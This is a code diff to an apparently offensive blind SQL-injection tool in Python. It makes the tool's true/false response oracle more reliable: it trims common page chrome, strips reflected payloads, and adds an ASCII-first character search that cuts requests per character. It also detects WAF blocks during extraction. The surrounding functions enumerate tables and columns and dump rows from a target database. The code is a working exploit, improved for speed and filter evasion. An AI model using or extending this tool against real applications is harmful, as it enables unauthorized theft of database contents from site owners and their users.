@@ -127,10 +127,25 @@ class Oracle:
         self.url, self.param, self.value = url, param, value
         self.template, self.context = template, context
         self._true, self._false = true_text, false_text
-        self.threshold = threshold       # below this on *both* pages = an anomaly (see ask)
+        # Compare on just the region where TRUE and FALSE differ: strip the common
+        # prefix/suffix (the identical page chrome). difflib then works on tens of
+        # characters instead of thousands — much faster on big pages — and the
+        # TRUE/FALSE margin is far wider, so bits are reliable even when the tell is
+        # a single line. (`threshold` arg kept for signature compat; recomputed here.)
+        self._pre, self._suf = _common_affixes(true_text, false_text)
+        self._tcore = self._core(true_text)
+        self._fcore = self._core(false_text)
+        self.threshold = min(0.95, (1.0 + _sim(self._tcore, self._fcore)) / 2)
         self.console = console
         self.cache = None        # a sqlcache.Cache once a walk starts (resume/skip)
         self.blocked = 0         # responses matching neither page (WAF / error / filter)
+
+    def _core(self, s: str) -> str:
+        """The part of a response that actually reacts to the condition — the page
+        with the common chrome (shared by the TRUE and FALSE pages) trimmed off."""
+        if len(s) <= self._pre + self._suf:
+            return s
+        return s[self._pre: len(s) - self._suf]
 
     @property
     def count(self):
@@ -143,8 +158,10 @@ class Oracle:
         body = _inject(self.http, self.url, self.param, payload)
         if not body:                    # timeout / empty: don't bias the search to True
             return False
-        rt = difflib.SequenceMatcher(None, body, self._true).ratio()
-        rf = difflib.SequenceMatcher(None, body, self._false).ratio()
+        body = _strip_payload(body, payload)   # a page that echoes our input adds per-request noise
+        core = self._core(body)
+        rt = _sim(core, self._tcore)
+        rf = _sim(core, self._fcore)
         # A response close to neither calibrated page is a *third* state — an
         # error/WAF/filter block (e.g. a denylisted keyword). Don't let it pass as
         # a clean True/False bit silently: count it, so the walk can warn and fall
@@ -159,6 +176,36 @@ def _sim(a, b):
     return difflib.SequenceMatcher(None, a, b).ratio()
 
 
+def _common_affixes(a, b):
+    """(len of common prefix, len of common suffix) shared by two strings — used to
+    trim identical page chrome so only the reacting region is compared."""
+    n = min(len(a), len(b))
+    p = 0
+    while p < n and a[p] == b[p]:
+        p += 1
+    s = 0
+    while s < n - p and a[-1 - s] == b[-1 - s]:
+        s += 1
+    return p, s
+
+
+def _strip_payload(body, payload):
+    """Remove the injected payload (and its HTML-escaped form) from a response.
+
+    Many apps reflect your input back — into a form value, a heading, an error.
+    That makes every probe's page slightly different (the payload text differs per
+    request), which adds noise to the TRUE/FALSE comparison and flips boolean bits.
+    Stripping the payload first leaves only the part of the page that actually
+    reacts to the *condition*, so the oracle is stable on reflecting targets."""
+    if not body or not payload:
+        return body
+    out = body.replace(payload, "")
+    esc = _html.escape(payload)
+    if esc != payload:
+        out = out.replace(esc, "")
+    return out
+
+
 def calibrate(http, url, param, value, console=None):
     """Find an injection context where TRUE and FALSE give different responses.
 
@@ -169,13 +216,15 @@ def calibrate(http, url, param, value, console=None):
     purely reflected payload (the `1=1`/`1=2` text echoed back) differs by a single
     character, which stays under the margin, so it isn't mistaken for an oracle."""
     for context, tmpl in _CONTEXTS:
-        t1 = _inject(http, url, param, tmpl.format(v=value, c="1=1"))
+        tp = tmpl.format(v=value, c="1=1")
+        fp = tmpl.format(v=value, c="1=2")
+        t1 = _strip_payload(_inject(http, url, param, tp), tp)
         if not t1:
             continue
-        f = _inject(http, url, param, tmpl.format(v=value, c="1=2"))
+        f = _strip_payload(_inject(http, url, param, fp), fp)
         if not f:
             continue
-        t2 = _inject(http, url, param, tmpl.format(v=value, c="1=1"))   # a second TRUE sample
+        t2 = _strip_payload(_inject(http, url, param, tp), tp)         # a second TRUE sample
         noise = _sim(t1, t2) if t2 else 1.0          # how much identical requests vary
         signal = _sim(t1, f)                         # how far FALSE sits from TRUE
         margin = max(0.0008, 3.0 * (1.0 - noise))    # must beat the page's own jitter
@@ -302,24 +351,56 @@ def extract_int(oracle, expr, cap=1 << 21) -> int:
     return lo
 
 
+def _extract_charcode(oracle, expr) -> int:
+    """A character's code point, ASCII-first: one probe assumes it's < 128 and a
+    7-step binary search reads it (~8 requests), falling back to the full Unicode
+    range only for a genuinely non-ASCII character. Most extracted data is ASCII,
+    so this roughly halves the requests per character versus searching 0..0x10FFFF.
+    Honours the per-value cache like extract_int."""
+    cache = getattr(oracle, "cache", None)
+    if cache is not None:
+        hit = cache.get(expr)
+        if hit is not None:
+            return hit
+    if oracle.ask(f"({expr}) > 127"):                 # non-ASCII: hand off to the full search
+        return extract_int(oracle, expr, cap=0x110000)
+    lo, hi = 0, 127
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        if oracle.ask(f"({expr}) >= {mid}"):
+            lo = mid
+        else:
+            hi = mid - 1
+    if cache is not None:
+        cache.put(expr, lo)
+    return lo
+
+
 def extract_str(oracle, prof, subquery, maxlen=256) -> str:
     """The string value of a sub-SELECT, one character at a time.
 
-    Char codes are capped at the Unicode maximum and bounds-checked before
-    chr(): on a noisy/unreliable oracle (a flaky real-world target) the binary
-    search can converge on a junk code — that becomes a '?', never a crash."""
+    Char codes are bounds-checked before chr(): on a noisy/unreliable oracle (a
+    flaky real-world target) the binary search can converge on a junk code — that
+    becomes a '?', never a crash."""
     n = min(extract_int(oracle, prof["length"].format(q=subquery)), maxlen)
     out = []
     for i in range(1, n + 1):
-        code = extract_int(oracle, prof["charcode"].format(q=subquery, i=i), cap=0x110000)
+        code = _extract_charcode(oracle, prof["charcode"].format(q=subquery, i=i))
         out.append(chr(code) if 0 < code <= 0x10FFFF else "?")
     return "".join(out)
 
 
 def _list(oracle, prof, count_expr, at_tmpl, **fmt):
     """Yield each value as it's pulled, so a caller can show partial results (and
-    keep what it has if the walk is interrupted)."""
+    keep what it has if the walk is interrupted).
+
+    If extracting the count tripped the anomaly detector — the catalog query was
+    filtered/blocked (a WAF), so the count is junk — yield nothing, so the caller
+    falls back to by-name guessing instead of chasing a runaway count."""
+    before = getattr(oracle, "blocked", 0)
     n = extract_int(oracle, count_expr.format(**fmt))
+    if getattr(oracle, "blocked", 0) > before:
+        return
     for k in range(n):
         yield extract_str(oracle, prof, at_tmpl.format(k=k, **fmt))
 
@@ -425,8 +506,12 @@ def columns(oracle, prof, table):
 
 
 def dump(oracle, prof, table, cols, limit=20):
-    """Yield rows one at a time (each a list of cell values)."""
+    """Yield rows one at a time (each a list of cell values). A filtered/blocked
+    row count yields nothing rather than chasing a runaway."""
+    before = getattr(oracle, "blocked", 0)
     rows_n = min(extract_int(oracle, prof["rows_n"].format(t=table)), limit)
+    if getattr(oracle, "blocked", 0) > before:
+        return
     for k in range(rows_n):
         yield [extract_str(oracle, prof, prof["cell_at"].format(c=c, t=table, k=k)) for c in cols]
 
